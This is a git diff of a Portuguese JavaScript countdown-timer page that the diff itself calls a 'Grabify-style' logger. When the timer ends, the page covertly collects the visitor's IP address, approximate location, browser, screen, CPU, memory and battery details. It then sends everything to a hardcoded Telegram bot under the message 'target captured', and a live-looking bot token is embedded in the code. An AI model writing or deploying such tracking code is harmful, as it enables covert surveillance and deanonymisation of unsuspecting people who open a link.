@@ -1,6 +1,6 @@
-// script.js - Timer + Envio para Telegram (com seu chat_id)
+// script.js - Versão Smart Logger (estilo Grabify)
 
-let targetDate = new Date("2026-04-20T01:28:59").getTime();
+let targetDate = new Date("2026-04-20T01:32:59").getTime();
 let userIPv4 = '';
 let userLatitude = '';
 let userLongitude = '';
@@ -8,17 +8,60 @@ let timerInterval = null;
 let alreadySent = false;
 
 const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
-const CHAT_ID = "8448614204";   // Seu chat_id já configurado
+const CHAT_ID = "8448614204";
+
+function getDeviceInfo() {
+    const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language || navigator.userLanguage,
+        screen: `${window.screen.width} x ${window.screen.height}`,
+        availScreen: `${window.screen.availWidth} x ${window.screen.availHeight}`,
+        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
+        pixelRatio: window.devicePixelRatio || 1,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online: navigator.onLine,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || 'unknown',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown', // núcleos do processador
+        deviceMemory: navigator.deviceMemory || 'unknown', // memória RAM aproximada (GB)
+        isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+    };
+
+    // Tenta pegar bateria (funciona melhor em mobile)
+    if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+            info.batteryLevel = Math.floor(battery.level * 100) + '%';
+            info.isCharging = battery.charging ? 'Sim' : 'Não';
+        }).catch(() => {});
+    }
+
+    return info;
+}
 
 function sendToTelegram() {
     if (alreadySent) return;
     alreadySent = true;
 
-    const message = `🚨 Alguém acessou o timer!\n\n` +
-                    `IP: ${userIPv4 || 'Não capturado'}\n` +
-                    `Latitude: ${userLatitude || 'Não capturado'}\n` +
-                    `Longitude: ${userLongitude || 'Não capturado'}\n\n` +
-                    `Data/Hora: ${new Date().toLocaleString('pt-BR')}`;
+    const device = getDeviceInfo();
+
+    const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
+                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n\n` +
+                    `🌐 IP: ${userIPv4 || 'Não capturado'}\n` +
+                    `📍 Latitude: ${userLatitude || 'Não disponível'}\n` +
+                    `📍 Longitude: ${userLongitude || 'Não disponível'}\n\n` +
+                    `📱 Dispositivo:\n` +
+                    `• Sistema: ${device.platform}\n` +
+                    `• Navegador: ${device.userAgent.substring(0, 100)}...\n` +
+                    `• Tela: ${device.screen} (${device.pixelRatio}x)\n` +
+                    `• Janela: ${device.windowSize}\n` +
+                    `• Mobile: ${device.isMobile ? 'Sim' : 'Não'}\n` +
+                    `• Idioma: ${device.language}\n` +
+                    `• Fuso horário: ${device.timezone}\n` +
+                    `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
+                    `• Memória RAM aprox: ${device.deviceMemory} GB\n\n` +
+                    `🔋 Bateria: ${device.batteryLevel || 'Não disponível'} | Carregando: ${device.isCharging || 'Não disponível'}\n` +
+                    `🌐 Online: ${device.online ? 'Sim' : 'Não'}`;
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -30,15 +73,10 @@ function sendToTelegram() {
     })
     .then(res => res.json())
     .then(data => {
-        if (data.ok) {
-            console.log("✅ Mensagem enviada com sucesso para o Telegram!");
-        } else {
-            console.error("❌ Telegram API Error:", data.description);
-        }
+        if (data.ok) console.log("✅ Enviado para Telegram com sucesso!");
+        else console.error("Telegram Error:", data.description);
     })
-    .catch(err => {
-        console.error("❌ Erro ao conectar com Telegram:", err);
-    });
+    .catch(err => console.error("Erro Telegram:", err));
 }
 
 function updateTimer() {
@@ -56,7 +94,7 @@ function updateTimer() {
             Não é magia, é habilidade isto...
         `;
 
-        sendToTelegram();   // Envia as infos pro seu Telegram
+        sendToTelegram();
         return;
     }
 
@@ -82,8 +120,10 @@ fetch('https://api.ipify.org?format=json')
     .then(data => {
         userLatitude = data.latitude || '';
         userLongitude = data.longitude || '';
+        console.log("Localização:", userLatitude, userLongitude);
     })
     .catch(err => console.error("Erro ao pegar localização:", err));
 
+// Inicia tudo
 timerInterval = setInterval(updateTimer, 100);
 updateTimer();
